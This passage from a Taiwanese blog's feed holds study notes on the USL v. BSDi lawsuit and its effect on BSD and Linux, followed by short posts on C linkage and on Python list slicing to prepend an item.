&lt;li&gt;After Net/1, BSD developer &lt;a href="https://en.wikipedia.org/wiki/Keith_Bostic"&gt;Keith Bostic&lt;/a&gt;  proposed that more non-AT&amp;amp;T sections of the BSD system be released  under the same license as Net/1. To this end, he started a project to  reimplement most of the standard Unix utilities without using the  AT&amp;amp;T code. For example, &lt;a href="https://en.wikipedia.org/wiki/Vi"&gt;vi&lt;/a&gt;, which had been based on the original Unix version of &lt;a href="https://en.wikipedia.org/wiki/Ed_%28Unix%29"&gt;ed&lt;/a&gt;, was rewritten as &lt;a href="https://en.wikipedia.org/wiki/Nvi"&gt;nvi&lt;/a&gt;  (new vi). Within eighteen months, all of the AT&amp;amp;T utilities had  been replaced, and it was determined that only a few AT&amp;amp;T files  remained in the kernel. These files were removed, and the result was the  June 1991 release of Networking Release 2 (Net/2), a nearly complete  operating system that was freely distributable.  &lt;/li&gt;
&lt;li&gt;Net/2 was the basis for two separate ports of BSD to the &lt;a href="https://en.wikipedia.org/wiki/Intel_80386"&gt;Intel 80386&lt;/a&gt; architecture: the free &lt;a href="https://en.wikipedia.org/wiki/386BSD"&gt;386BSD&lt;/a&gt; by &lt;a href="https://en.wikipedia.org/wiki/William_Jolitz"&gt;William Jolitz&lt;/a&gt; and the &lt;a href="https://en.wikipedia.org/wiki/Proprietary_software"&gt;proprietary&lt;/a&gt; &lt;a href="https://en.wikipedia.org/wiki/BSD/OS"&gt;BSD/386&lt;/a&gt; (later renamed BSD/OS) by &lt;a href="https://en.wikipedia.org/wiki/Berkeley_Software_Design"&gt;Berkeley Software Design&lt;/a&gt; (BSDi). 386BSD itself was short-lived, but became the initial code base of the &lt;a href="https://en.wikipedia.org/wiki/NetBSD"&gt;NetBSD&lt;/a&gt; and &lt;a href="https://en.wikipedia.org/wiki/FreeBSD"&gt;FreeBSD&lt;/a&gt; projects that were started shortly thereafter.  &lt;/li&gt;
&lt;li&gt;BSDi soon found itself in legal trouble with AT&amp;amp;T's &lt;a href="https://en.wikipedia.org/wiki/Unix_System_Laboratories"&gt;Unix System Laboratories&lt;/a&gt; (USL) subsidiary, then the owners of the System V &lt;a href="https://en.wikipedia.org/wiki/Copyright"&gt;copyright&lt;/a&gt; and the Unix trademark. The &lt;a href="https://en.wikipedia.org/wiki/USL_v._BSDi"&gt;&lt;em&gt;USL v. BSDi&lt;/em&gt;&lt;/a&gt; lawsuit was filed in 1992 and led to an &lt;a href="https://en.wikipedia.org/wiki/Injunction"&gt;injunction&lt;/a&gt; on the distribution of Net/2 until the validity of USL's copyright claims on the source could be determined.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;和解條件&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;釋出不包含爭議原始碼的發行版 4.4BSD-lite ，Berkeley 鼓勵使用者改換此版本  &lt;/li&gt;
&lt;li&gt;Berkeley 停止散佈部分檔案  &lt;/li&gt;
&lt;li&gt;USL 給爭議原始碼的使用者三個月的寬限期  &lt;/li&gt;
&lt;li&gt;部分 Berkeley 散佈的檔案必須包含 USL 授權告示  &lt;/li&gt;
&lt;li&gt;部分 USL 散佈的檔案必須包含 Berkeley 授權告示  &lt;/li&gt;
&lt;li&gt;USL 允許自由散佈部分檔案  &lt;/li&gt;
&lt;li&gt;University not to actively assist in legal attempts to challenge USL's rights to certain files.  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ref:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.groklaw.net/article.php?story=20041126130302760"&gt;The 1994 USL-Regents of UCal Settlement Agreement  - PDF and text&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;影響&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;The lawsuit slowed development of the free-software descendants of BSD  for nearly two years while their legal status was in question, and as a  result systems based on the &lt;a href="https://en.wikipedia.org/wiki/Linux_kernel"&gt;Linux kernel&lt;/a&gt;, which did not have such legal ambiguity, gained greater support. Although not released until 1992, development of &lt;a href="https://en.wikipedia.org/wiki/386BSD"&gt;386BSD&lt;/a&gt; predated that of Linux. &lt;a href="https://en.wikipedia.org/wiki/Linus_Torvalds"&gt;Linus Torvalds&lt;/a&gt; has said that if 386BSD or the &lt;a href="https://en.wikipedia.org/wiki/GNU_kernel"&gt;GNU kernel&lt;/a&gt; had been available at the time, he probably would not have created Linux.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;strong&gt;BSD Family&lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://github.com/freebsd/freebsd/blob/master/share/misc/bsd-family-tree"&gt;/share/misc/bsd-family-tree&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;386BSD  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;由 Berkeley 校友  &lt;a href="http://en.wikipedia.org/wiki/Lynne_Jolitz"&gt;Lynne Jolitz&lt;/a&gt; 和 &lt;a href="http://en.wikipedia.org/wiki/William_Jolitz"&gt;William Jolitz&lt;/a&gt; 把 4.3BSD-Reno / 4.3BSD Net/2 移植到 Intel 80386 上 (80386 硬體在當時相對便宜很多)  &lt;/li&gt;
&lt;li&gt;補上了 Net/2 缺乏的部份  &lt;/li&gt;
&lt;li&gt;成為 FreeBSD 和 NetBSD 的基礎  &lt;/li&gt;
&lt;li&gt;沒有被牽入訴訟之中  &lt;/li&gt;
&lt;li&gt;台灣當時有 Newsgroup (tw.bbs.comp.386bsd) 在研究 BSD 相關技術  &lt;/li&gt;
&lt;li&gt;4.3BSD  &lt;/li&gt;
&lt;li&gt;Net/1 ：包含 berkeley 修改的 networking code  &lt;/li&gt;
&lt;li&gt;Net/2 ：berkeley 改寫了更多工具程式，以規避 at&amp;amp;t 的著作權  &lt;/li&gt;
&lt;li&gt;4.4BSD  &lt;/li&gt;
&lt;li&gt;4.4BSD-Lite : 訴訟和解後 berkeley 釋出不含 AT&amp;amp;T 原始碼的版本，BSD License  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;4.4BSD-Encumbered&lt;/strong&gt; : 包含 AT&amp;amp;T 原始碼，僅提供給 AT&amp;amp;T 授權者  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;補充&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.dropbox.com/s/ih4eius66dyr1qi/20150422.pdf?dl=0"&gt;商業應用自由開源軟體的訴訟大事紀概述&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;strong&gt;角色介紹&lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;USL&lt;/strong&gt; (UNIX System Laboratories, Inc.)  &lt;/li&gt;
&lt;li&gt;1989 創立，是 Bell labs 的子組織  &lt;/li&gt;
&lt;li&gt;1990開始負責 UNIX 開發  &lt;/li&gt;
&lt;li&gt;後來變成 AT&amp;amp;T 的 wholly owned subsidiary ，完全受到 AT&amp;amp;T 控制的子公司  &lt;/li&gt;
&lt;li&gt;Bell labs 又是 AT&amp;amp;T 的一個部門（或是子公司？）  &lt;/li&gt;
&lt;li&gt;1993/Jun Novell 買下 USL ，所有財產、商標及專利，包含 UNIX 的財產權  &lt;/li&gt;
&lt;li&gt;BSDI (Berkeley Software Design, Inc.)  &lt;/li&gt;
&lt;li&gt;1991 由 Rick Adams 及 CSRG 的成員們所創立  &lt;/li&gt;
&lt;li&gt;開發及販賣 BSD/OS （proprietary 版本的 BSD）的授權  &lt;/li&gt;
&lt;li&gt;1999 試圖模仿 RedHat 的模式進行 IPO ，不幸的是這個策略後來失敗，總裁 Rob Kolstad 離開公司之後不久，公司面臨破產  &lt;/li&gt;
&lt;li&gt;2000 BSDI 與 &lt;a href="https://en.wikipedia.org/wiki/Walnut_Creek_CDROM"&gt;Walnut Creek CDROM&lt;/a&gt; 合併  &lt;/li&gt;
&lt;li&gt;2001 年，在巨大的財務壓力下，BSDI 將軟體部門售出給&lt;a href="https://en.wikipedia.org/wiki/Wind_River_Systems"&gt;Wind River Systems&lt;/a&gt;，公司的剩餘部門更名為 iXsystems ，專注在伺服器硬體的業務  &lt;/li&gt;
&lt;li&gt;CSRG, &lt;strong&gt;Computer Systems Research Group&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;CSRG 是 Berkeley 的研究團隊，目的在 AT&amp;amp;T UNIX 的基礎上進行開發及增強，經費來源是 DARPA  &lt;/li&gt;
&lt;li&gt;1974 柏克萊大學的 Bob Fabry 教授從 AT&amp;amp;T 取得 UNIX 的授權，Berkeley 開始修改 AT&amp;amp;T UNIX ，並將修改後的版本發佈為 Berkeley Software Distribution  &lt;/li&gt;
&lt;li&gt;1980/Apr Professor Fabry 跟 DARPA 簽了合約，進一步開發 UNIX 以支援 ARPAnet 功能使用的需求  &lt;/li&gt;
&lt;li&gt;1995 解散  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;問題&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;FreeBSD 是否有像 Linux 一樣類似 OIN 的組織？  &lt;/li&gt;
&lt;li&gt;似乎是沒有，請老師補充（補充：如果指的是「協助處理專利問題的相關組織」，沒有。）  &lt;/li&gt;
&lt;li&gt;The FreeBSD Foundation 會協助處理專利問題，還有其他法律或是和廠商間的合約問題。  &lt;/li&gt;
&lt;li&gt;這場戰爭後對於之後開源與商業間有什麼影響？（基本上就是稍阻開源軟體的商業應用，一段時間內商業公司迴避採用BSD-based的系統來進行產品製作，一直到GNU Linux的重新創作，才又再蓬勃發展。）  &lt;/li&gt;
&lt;li&gt;Difference between NET/1 and NET/2 ?h  &lt;/li&gt;
&lt;li&gt;衍生著作 (derivative work) 的基本原則 : A work based on the original work.  &lt;/li&gt;
&lt;li&gt;抄襲  &lt;ol&gt;
&lt;li&gt;抄 - 著作權  &lt;/li&gt;
&lt;li&gt;襲 - 改作權  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;NET/1 先處理"抄"的問題  &lt;/li&gt;
&lt;li&gt;NET/2 再處理"襲"的問題  &lt;/li&gt;
&lt;li&gt;為什麼 Jollitz 沒有被告但是 BSDI 卻被告了？  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;歸責-因果關係  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Difference between NET/1 and NET/2?  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;抄襲：抄─侵犯著作人的重製權 reproduction；襲─侵犯著作人的改作權，如翻譯哈利波特，即是改作的行為，因此須先取得作者的許可。  &lt;/li&gt;
&lt;li&gt;抄襲 in 程式碼：抄─直接抄程式碼；襲─根據別人的程式碼進行改寫。改寫又牽扯到 衍生著作 derivative work: a work based on the original work.  &lt;/li&gt;
&lt;li&gt;訴訟的目的不一定是要贏，有時候是為了阻斷對方的商業進展。以 AT&amp;amp;T 和 BSD 的訴訟而言，AT&amp;amp;T 確實是該告對方(阻止 BSDi 的商業發展)，就結果來說(和解且 BSDi 發展不下去) AT&amp;amp;T 是獲勝的，只是沒想到後有 Linux 的出現。  &lt;/li&gt;
&lt;li&gt;386BSD: 由一對 Berkeley 校友從 NET/2 版本進行改寫，將此作業系統成功移植至 intel 80386 (當時比較便宜的電腦主機) 並將所有跟 AT&amp;amp;T 相關的程式碼拔除，以及補上其不足的功能。後來成為 FreeBSD、OpenBSD 的前身。  &lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;分工表&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;過程：鄭順一  &lt;/li&gt;
&lt;li&gt;影響：許邱翔  &lt;/li&gt;
&lt;li&gt;角色介紹：林育德  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Misc &amp;amp; Memo&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;A Narrative History of BSD&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Wikipedia&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Berkeley_Software_Distribution"&gt;https://en.wikipedia.org/wiki/Berkeley_Software_Distribution&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;FreeBSD.org&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.freebsd.org/doc/en_US.ISO8859-1/articles/explaining-bsd/why-is-bsd-not-better-known.html"&gt;https://www.freebsd.org/doc/en_US.ISO8859-1/articles/explaining-bsd/why-is-bsd-not-better-known.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;參考&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.livinginternet.com/i/iw_unix_war.htm"&gt;&lt;strong&gt;Unix Wars&lt;/strong&gt;&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.oreilly.com/openbook/opensources/book/kirkmck.html"&gt;Twenty Years of Berkeley Unix - From AT&amp;amp;T-Owned to Freely Redistributable&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.freebsddiary.org/linux.php"&gt;The FreeBSD Diary -- Why is Linux Successful? - An Opinion.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;support of cheap hardware  &lt;/li&gt;
&lt;li&gt;visibility on Usenet (marketing)  &lt;/li&gt;
&lt;li&gt;the USL lawsuit against BSD  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.freebsd.org/doc/en_US.ISO8859-1/articles/explaining-bsd/why-is-bsd-not-better-known.html"&gt;Why&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.freebsd.org/doc/en_US.ISO8859-1/articles/explaining-bsd/why-is-bsd-not-better-known.html"&gt;is BSD not better known?&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://linuxfr.org/nodes/88229/comments/1291183"&gt;Interview with Andrew Tanenbaum&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;The reason MINIX 3 didn't dominate the world has to do with one mistake I  made about 1992. At that time I thought BSD was going to take over the world. It was a mature and stable system. I didn't see any point in  competing with it, so I focused MINIX on education. Four of the BSD guys  had just formed a company to sell BSD commercially. They even had a  nice phone number: 1-800-ITS-UNIX. That phone number did them and me in.  AT&amp;amp;T sued them over the phone number and the lawsuit took 3 years  to settle. That was precisely the period Linux was launched and BSD was  frozen due to the lawsuit. By the time it was settled, Linux had taken  off. My mistake was not to realize the lawsuit would take so long and  cripple BSD. If AT&amp;amp;T had not brought suit (or better yet, bought  BSDI), Linux would never have become popular at all and BSD would  dominate the world.  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://lwn.net/Articles/467852/"&gt;https://lwn.net/Articles/467852/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;1996 年的 WWDC 上，Apple 宣佈推出 &lt;a href="http://en.wikipedia.org/wiki/MkLinux"&gt;MkLinux&lt;/a&gt;，這是建構於 Mach microkernel 的 Linux 系統，運作於 Macintosh  電腦硬體。雖然之後 MkLinux 停止發展，但至今 &lt;a href="http://opensource.apple.com/"&gt;Mac OS X 的原始程式碼&lt;/a&gt;仍可見到 MkLinux 的蹤跡，像是在 libc。之後隨著 NeXTSTEP 的合併進 Apple，BSD 程式碼和 Mach microkernel 組成了 &lt;a href="http://en.wikipedia.org/wiki/XNU"&gt;XNU&lt;/a&gt; 這個新的 hybrid。MkLinux 是首個由 Apple 支持的開放原始碼專案，開發經驗對日後以 Mach 3.0 為基礎的 Mac OS X 有很大的助益。  &lt;/li&gt;
&lt;li&gt;1991 年末釋出的 Linux kernel，到 1995 年就促使 Open Software Foundation (和 open source 推廣無關，但部份成果的確以 open source license 釋出) 與 Apple 採納作為產品核心  &lt;/li&gt;
&lt;li&gt;參考資料: &lt;a href="https://gate.crashing.org/doc/ppc/doc003.htm"&gt;History of Linux for the PowerPC&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;MkLinux 許多原始程式碼的宣告是 Copyright 1991-1998 Open Software Foundation, Inc. (MIT 授權)，如 DR3/osfmk/src/mach_kernel/i386/i386_lock.s  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.softpanorama.org/People/Torvalds/Finland_period/att_lawsuit_as_a_launcher_for_linux.shtml"&gt;AT&amp;amp;T lawsuit helps to launch Linux into mainstream&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;時間點很重要  &lt;/li&gt;
&lt;li&gt;"In late 1991 there were 100 programmers on UseNet producing improvements for (BSD)," said Wes Peters, a BSD user from the beginning. "If not for the AT&amp;amp;T lawsuit at the worst moment.... Because of that, people said, 'I don't want to go with BSD now.' That was the time Linux was gaining functionality."  &lt;/li&gt;
&lt;li&gt;Unix版权史  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2010/03/unix_copyright_history.html"&gt;http://www.ruanyifeng.com/blog/2010/03/unix_copyright_history.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;AT&amp;amp;T与BSD之间的诉讼，是当代版权制度最恶劣的应用之一。  &lt;/li&gt;
&lt;li&gt;为什么这么说？  &lt;/li&gt;
&lt;li&gt;首先，起诉者其实与Unix毫无关系。这是AT&amp;amp;T经理层的决定，而不是开发者的决定。事实上，包括Ken Thompson在内的技术人员一直希望，公司能够公开源码。他们完全有理由这么要求，因为Unix从来不是AT&amp;amp;T的业务重点，最初是个人项目，后来也没有占用公司太多资源。销售Unix的利润，在公司全部业务中，几乎可以忽略不计。为了一点点钱，去打击一个使许多人受益的产品，何必这样做呢。  &lt;/li&gt;
&lt;li&gt;其次，AT&amp;amp;T根本不关心Unix的发展。它真正关心的是金钱和削弱对手。1994年，官司还没有结束，它就把Unix卖给了Novell公司，从此不再与Unix发生关系，官司也因此不了了之。既然你不想要这个产品，为什么要提起诉讼呢？真是不可理解。  &lt;/li&gt;
&lt;li&gt;最后，所谓的侵权几乎是不存在的。因为Novell从AT&amp;amp;T买下Unix版权后，检查了BSD的源码，在18000个组成文件中删除了3个，并对其他文件做了一些小修改，然后BSD就重新获得了自由发布源码的许可。这意味着，至多只有千分之一的BSD代码有版权问题，但是就因为这千分之一的问题，导致百分之百的产品被迫中断，完全不符合比例原则。  &lt;/li&gt;
&lt;li&gt;所以，这场版权官司就是一家利益至上的公司，以微不足道的理由，为了一个自己根本不在乎的产品，悍然发动一场损人不利己的战争。  &lt;/li&gt;
&lt;li&gt;更為自由的開放源碼作業系統  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.openfoundry.org/tw/opensource-history/1891"&gt;https://www.openfoundry.org/tw/opensource-history/1891&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;由於 Unix 中包含原始碼，使得研究機構可以修改並擴充 Unix，加州大學柏克萊分校的研究生 Bill Joy 就以此方式於 1977 年延伸出 BSD（Berkeley Software Distribution），BSD 一開始僅是 Unix 的外掛，並非完整的作業系統，一直要到了1983 年的 2.9 BSD 才首次作為一個完整的作業系統釋出。1991 年，BSD Networking Release 2 釋出，除去多數 AT&amp;amp;T Unix 的原始碼，成為 386BSD 和 BSD/386 的前身，此一主張同時主張其使用者不需再取得 AT&amp;amp;T 授權。這使得 AT&amp;amp;T 所屬的 Unix System Laboratories 向 Berkeley Software Design, Inc. 提起訴訟，造成 Networking Release 2 直到爭議釐清前都無法散布。USL v. BSDi 一案於 1992 年提出，1994 年達成和解，這期間導致 BSD 開發趨緩，使得另一個開放源碼作業系統 Linux 後來居上。  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.linux.org.tw/~jserv/archives/002042.html"&gt;Jserv's blog: 不再囉唆：NetBSD 簡化BSD 授權條款&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;隨著 BSD 的成熟，人們意識到摻雜 AT&amp;amp;T UNIX 的程式碼，意味著高價的授權 (AT&amp;amp;T License) 與使用上的限制，沒辦法透過當時開始發展的網路 (Ethernet) 作廣泛的散播，是此，在許多貢獻者的投入下，1989 年六月，Networking Release 1 (Net/1) 誕生了，不需 AT&amp;amp;T 授權也使用，當時一個劃時代的變革就是將上述四個條款的 BSD 授權聲明含入，只要在這個新的遊戲規則下，都可自由再發佈。而我們也可從這原始的四項被授權人的條件限制中，看出對於原始程式與二進位執行檔的散播形式 (需保有授權與免責聲明)、於程式本體提及 Net/1 研發背後的加州大學、禁止以貢獻者或加州大學之名，行衍生軟體之背書、推廣、促銷等行為，意思就是為這嶄新的系統，制定得以自由使用的規則。而到了 1991 年六月，Net/2 已幾近全新的作業系統，不含 AT&amp;amp;T 的程式碼，而 Net/2 在 Intel 80386 硬體架構的移植，由 William Jolitz 負責下進行，也被稱為 386BSD，後來，由握有 System V 版權、Unix 商標的 UNIX Systems Laboratories (USL，為 AT&amp;amp;T 附屬子公司) 對 Net/2 在 80386 硬體的封閉專屬 BSD/OS 背後研發的 Berkeley Software Design (BSDi) 公司，提出法律訴訟，延宕了多年，直到 1994 年一月份才落幕，並引來 BSD 原始程式碼重整的動作，顯然，對系出同門的 386BSD 來說，不免也受到影響，而無法在法律爭端休止前，作自由的開發與使用。  &lt;/li&gt;
&lt;li&gt;UNIX的歷史沿革  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://content.sp.npu.edu.tw/teacher/kkhuang/Shared%20Documents/Linux作業系統/UNIX的歷史沿革.pdf"&gt;http://content.sp.npu.edu.tw/teacher/kkhuang/Shared%20Documents/Linux作業系統/UNIX的歷史沿革.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;FreeBSD TCP/IP stack  &lt;/li&gt;
&lt;li&gt;[2015] &lt;a href="http://www.dmst.aueb.gr/dds/pubs/conf/2015-MSR-Unix-History/html/Spi15c.html"&gt;A Repository with 44 Years of Unix Evolution&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;[GitHub] &lt;a href="https://github.com/dspinellis/unix-history-repo"&gt;dspinellis/unix-history-repo&lt;/a&gt;&lt;br /&gt;
&lt;img alt="UNIX branches" src="http://www.dmst.aueb.gr/dds/pubs/conf/2015-MSR-Unix-History/html/branches.png" /&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;[2012] &lt;a href="http://www.linuxdevcenter.com/pub/a/linux/2002/02/28/caldera.html"&gt;Why Caldera Released Unix: A Brief History&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;[Wikipedia] &lt;a href="http://en.wikipedia.org/wiki/Ancient_UNIX"&gt;Ancient UNIX&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Unix传奇  &lt;/li&gt;
&lt;li&gt;(上篇) &lt;a href="http://coolshell.cn/articles/2322.html"&gt;http://coolshell.cn/articles/2322.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;(下篇) &lt;a href="http://coolshell.cn/articles/2324.html"&gt;http://coolshell.cn/articles/2324.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://embedded2015.hackpad.com/UNIX-History-o6ganUMGhbm"&gt;UNIX 相關歷史&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;歡迎一起考古！ --jserv  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;旁徵博引  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/SCO%E2%80%93Linux_controversies"&gt;https://en.wikipedia.org/wiki/SCO%E2%80%93Linux_controversies&lt;/a&gt; Linux 的官司  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;See Also:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linux Foundation, OIN  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;TODO:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;將參考資料分類並分工研讀  &lt;/li&gt;
&lt;li&gt;~~填寫分工表~~  &lt;/li&gt;
&lt;li&gt;~~研讀誠夏老師提供的簡報(開源軟體法律訴訟案例)~~  &lt;/li&gt;
&lt;li&gt;訴訟、商業化、授權條款之間的關係  &lt;/li&gt;
&lt;li&gt;探討這場官司對於現在的影響  &lt;/li&gt;
&lt;li&gt;BSDi 導火線  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;5/18 報告後 TODO:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AT&amp;amp;T 公司介紹，後來為何被拆成好幾個子公司等補充介紹  &lt;/li&gt;
&lt;li&gt;整場訴訟的前情提要、為什麼要打官司、官司內容、最後結果與影響  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="BSD"></category><category term="AT&amp;T"></category><category term="Open Source"></category></entry><entry><title>static/extern/inline function/variable in C</title><link href="https://blog.m157q.tw/posts/2015/06/02/static-extern-inline-function-variable-in-c/" rel="alternate"></link><published>2015-10-26T14:16:00+08:00</published><updated>2015-10-26T14:16:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-06-02:posts/2015/06/02/static-extern-inline-function-variable-in-c/</id><summary type="html">&lt;p&gt;&lt;a href="http://sitcon.kktix.cc/events/sitcon-ccca-meetup-12"&gt;SITCON x CCCA 新竹定期聚 #12 - extern/static/inline function/variable in C by susu&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;教材：&lt;a href="https://github.com/u1240976/mess_note/blob/master/talk/internal_and_external_linkage_in_C.rst"&gt;mess_note/internal_and_external_linkage_in_C.rst at master · u1240976/mess_note · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;錄影：&lt;a href="https://www.youtube.com/watch?v=wBXAzhO2HaA"&gt;https://www.youtube.com/watch?v=wBXAzhO2HaA&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;錄音：&lt;a href="https://plus.google.com/events/cb13m4vrrf9tjckgkic599pditc"&gt;https://plus.google.com/events/cb13m4vrrf9tjckgkic599pditc&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;感謝 &lt;a href="https://github.com/u1240976"&gt;susu&lt;/a&gt; 的介紹，&lt;br /&gt;
覺得 github 上那個 note 整理的很棒，&lt;br /&gt;
之前一直不太懂這部分，&lt;br /&gt;
現在總算比較清楚了，&lt;br /&gt;
之後有時間應該來好好再確認自己真的弄懂了。  &lt;/p&gt;</summary><category term="C"></category><category term="static"></category><category term="extern"></category><category term="inline"></category><category term="SITCON"></category><category term="Meetup"></category></entry><entry><title>Magic of Python list slicing</title><link href="https://blog.m157q.tw/posts/2015/05/25/magic-of-python-list-slicing/" rel="alternate"></link><published>2015-06-23T05:47:38+08:00</published><updated>2015-06-23T05:47:38+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-05-25:posts/2015/05/25/magic-of-python-list-slicing/</id><summary type="html">&lt;p&gt;主要是想查 Python 要怎麼漂亮的寫 prepend 一個 item 到 list 時&lt;br /&gt;
找到了這篇 &lt;a href="http://stackoverflow.com/questions/17911091/append-integer-to-beginning-of-list-in-python"&gt;append integer to beginning of list in python - Stack Overflow&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;主要就三種寫法：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一種，把 item 塞進一個 list 然後再加上原本的 list  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;第二種，用 built-in 的 list.insert  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;第三種，評分最低、也是引起我好奇的寫法  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;試了一下，發現真的可以這樣做，但在這之前從來沒看過這寫法。&lt;br /&gt;
於是就去翻了一下官方的文件&lt;br /&gt;
&lt;a href="https://docs.python.org/3.4/tutorial/datastructures.html"&gt;5. Data Structures — Python 3.4.3 documentation&lt;/a&gt;&lt;br /&gt;
發現裡頭有類似的東西，以前都沒仔細看。  &lt;/p&gt;
